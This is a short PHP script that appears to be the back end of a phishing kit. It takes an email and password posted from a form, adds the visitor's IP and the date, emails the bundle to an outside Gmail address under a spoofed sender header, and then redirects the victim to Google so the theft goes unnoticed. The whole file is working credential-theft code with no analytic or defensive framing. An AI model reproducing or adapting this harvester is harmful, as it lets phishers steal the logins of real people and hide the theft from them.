<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "========== http://sambatoolshop.biz/ ===================\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "----------------------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "======= http://sambatoolshop.biz/ =============\n";

$recipient = "businessisamust216@gmail.com";
$subject = "PDF Results = $ip";
$headers = "From: SAMBATOOLSHOP <hello@maersksolid.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: HTTPS://google.com");

	   }


?>